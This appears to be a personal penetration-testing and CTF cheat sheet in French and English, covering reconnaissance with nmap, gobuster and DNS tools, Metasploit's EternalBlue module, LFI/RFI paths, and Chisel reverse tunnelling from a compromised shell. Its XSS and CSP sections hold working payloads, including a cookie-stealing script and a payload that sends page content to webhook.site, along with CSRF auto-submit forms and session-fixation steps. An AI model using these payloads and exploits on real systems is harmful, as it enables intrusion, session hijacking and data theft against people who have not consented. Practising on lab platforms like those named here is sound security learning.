## Basic Tools

| **Command**   | **Description**   |

| **Vim** |
	| `vim file` | vim: open file with vim |
	| `esc+i` | vim: enter `insert` mode |
	| `esc` | vim: back to `normal` mode |
	| `x` | vim: Cut character |
	| `dw` | vim: Cut word |
	| `dd` | vim: Cut full line |
	| `yw` | vim: Copy word |
	| `yy` | vim: Copy full line |
	| `p` | vim: Paste |
	| `:1` | vim: Go to line number 1. |
	| `:w` | vim: Write the file 'i.e. save' |
	| `:q` | vim: Quit |
	| `:q!` | vim: Quit without saving |
	| `:wq` | vim: Write and quit |

# Active Reconnaissance Service Scanning
```
nmap -Pn -A -sC -p- 10.129.42.253
```
## _display ssl ports only_
```
nmap -p 31000-32000 -sV --open -v localhost | grep -E '^[0-9]+/tcp.*ssl/.*$'
```
	| `locate scripts/citrix` | List various available nmap scripts |
	| `nmap --script smb-os-discovery.nse -p445 10.10.10.40` | Run an nmap smb script on an IP |
	| `nmap -sV --script=http-enum -oA name_file 10.129.42.190` | enumerate common web application directories |
	| `nc -nv 10.129.42.190 22` | Get the banner |
	| `netcat 10.10.10.10 22` | Grab banner of an open port |
	| `openssl s_client -connect localhost:30001` | Connect to remote host by ssl protocole

# Passive Reconnaissance 
	| `whois <address>` | général info |
	
	

# Web Enumeration
#gobuster_cmd
```
gobuster dir  -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://$ip/
```
## par rapport au cms
```
$ find /usr/share/seclists/Discovery/Web-Content/ -type f -name *<cms_name>* 2>/dev/null
```
## php web server
```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt -u http://challenge01.root-me.org/web-serveur/ch11/
```
##
	| `enum4linux @IP` | scan website |

	| `ffuf -w /usr/share/wordlists/dirb/big.txt -u http://thm/FUZZ` | same thing |
	| `dirsearch -u @HOST` | directory scan |
	| `curl -IL https://www.inlanefreight.com` | Grab website banner |
	| `whatweb 10.10.10.121` | List details about the webserver/certificates |
	| `curl <address> -v` | View http header |
	| `curl <address/sitemap.xml>` | vew directory referenced for search engine |
	| `curl -X POST -d "param1=value1&param2=value2" https://example.com/api` | |
## backup files #backupFiles
### metasploit
`msf6 > use auxiliary/scanner/http/backup_file`
On définit le host à scanner :
`msf6 auxiliary(scanner/http/backup_file) > set rhosts challenge01.root-me.org`
Ainsi que le path :
`msf6 auxiliary(scanner/http/backup_file) > set path web-serveur/ch11/index.php`
Enfin on lance le scan :
`msf6 auxiliary(scanner/http/backup_file) > run`
# DNS Enumeration
```
gobuster dns -d inlanefreight.com -w /usr/share/seclists/Discovery/DNS/namelist.txt
```
	| `host -t ns -p54011 adresse` | Display domain master and subdns |
	| `dig -t ns @<address>` | same thing |
	| `dig @1.1.1.1 tryhackme.com MX` |  |
	| `nslookup -type=A adresse 1.1.1.1` | |
	| `dnsenum axfr <subdomain> @<domain>` | zone transfer |
	| `use DNSDumpster.com or shodan.io`

# Subdomaine enumeration 
```
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 --append-domain -u http://$ip/
```
## _online enumeration_
```
sublist3r -d domaine_name -b /usr/lib/python3/dist-packages/subbrute/names.txt
```

|
# Amazone s3 buckets interact with awscli
	| `aws configure` | |
	| `aws --endpoint=http://s3.domaine_name s3 ls s3://domaine_name` | list s3 bucket container |
|

|
# Public Exploits
Rechercher un exploit sur l'application et les services hébergé
	| `searchsploit openssh 7.2` | Search for public exploits for a web application |
	| `msfconsole` | MSF: Start the Metasploit Framework |
	| `search exploit eternalblue` | MSF: Search for public exploits in MSF |
	| `use exploit/windows/smb/ms17_010_psexec` | MSF: Start using an MSF module |
	| `show options` | MSF: Show required options for an MSF module |
	| `set RHOSTS 10.10.10.40` | MSF: Set a value for an MSF module option |
	| `check` | MSF: Test if the target server is vulnerable |
	| `exploit` | MSF: Run the exploit on the target server is vulnerable |
|
# Web Exploits
## curl
```
curl -H "Content-type: application/json" --Cookie "<name>=<value>" -d '{"data":"data"}' -X POST http://domaine
```
## LFI 
#Exploit_LFI/RFI
LFI (Local File Inclusion) est une vulnérabilité de sécurité informatique qui permet à un attaquant d'inclure des fichiers locaux sur un serveur distant.
```
http://adresse/?page=../etc/passwd
```
```
http://adresse/?page=C:/WINDOWS/System32/drivers/etc/hosts
```

## RFI
RFI (Remote File Inclusion) est une vulnérabilité de sécurité informatique similaire à la LFI, mais qui permet à un attaquant d'inclure des fichiers distants à partir d'un serveur malveillant sur un serveur distant.
```
http://remote@IP/?page=//@ip_hacker/somefile
```

# CSP
#ExploitCSP[[CSP]]
## Site de test CSP en ligne
https://csp-evaluator.withgoogle.com/
Google fournit une page Web de diagnostic (?) CSP appelée CSP Evaluator, et si vous la testez, elle vous informera des éléments CSP manquants. Il est normal de l'utiliser comme valeur de référence.
## Bypass script-src unsafe-inline
```
<Svg OnLoad=alert(domain)>
```
```
<img src="" onerror="alert(1)">
```
On peut modifier le domaine de base du site web par celui d'un serveur d'écoute pour recevoir les requêtes en écrivant du code js dans l'attribut *onerror*
```
// flag location in document
var flag=document.querySelector("body > div > div > p").innerText;
// bypass http and ':' filtering
document.write("<base href=\"http+String.fromCharCode(58)+"//webhook.site"+"\" />");
// redirect to webhook.site
document.location="229885cb-f49d-41fc-b954-2e2c56a2248c?test="+flag;
```
ce qui donne le payload
```
<img src='#' onerror='var flag=document.querySelector("body").innerText;document.write("<base href=\"ht"+"tp"+String.fromCharCode(58)+"//webhook.site"+"\" />");document.location="dc09032a-d28b-47f5-9297-8ea08e0c945e?test="+flag;'>
```
# CSRF
#ExploitCSRF
```
<img src= x onerror='document.location="?action=profile";document.getElementByName('username').value = "dine";document.forms[0].submit();'>
```

```
<form action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data">
	<input type="hidden" name="username" value="username">
	<input type="hidden" name="status" value="on">
</form>
<script>document.forms[0].submit()</script>
```

# XSS
#ExploitXSS
## Insertion de script
```
<script>alert("Coucou !');</script>
```
### Vole de cookie
```
<script>
document.write('<img src="[URL]?c='+document.cookie+'" />');
</script>
```
### Redirection automatique
```
<script>document.location="http://www.hsc.fr/"</script>
```
Rend inutilisable la page générée ✗ L'utilisateur ne comprend pas la manipulation
### Fixation de session
✗ Principe : utiliser un XSS afin d'imposer un cookie connu à la victime 
✗ Schéma : 
✗ L'attaquant se connecte sur le serveur en mode anonyme 
 Il reçoit un cookie de session (ex JSP ou PHP) 
✗ Il utilise un XSS sur un serveur du même domaine pour fixer le cookie chez la victime (via le code JavaScript de type 
```
<script> document.cookie="PHPSESSIONID=78191;domain=.site.fr" <script>
```
✗ Il attend que la victime s'authentifie sur le serveur. Si celui ci est mal programmé (exemple sessions J2EE), le cookie sera accepté. 
✗ L'attaquant possède alors un cookie de session authentifié valide qu'il peut utiliser en parallèle avec la victime

## Insertion de tags HTML
### En particulier de tags
```
<img src="http://www.serveur.tld/image.jpg"/>
```
```
<img src= x onerror(alerte(1))>
```

# foothold exploit
## Partage des ports de la cible sur ma machine
On utilise *Chisel* https://github.com/jpillora/chisel/releases/tag/v1.9.1
### creation du serveur proxi sur ma machine
└─# 
```
./chisel server -p 8000 --reverse
```

www-data@only4you:/tmp$
```
./chisel client 10.10.17.161:8000 R:127.0.0.1:3000 R:127.0.0.1:8001
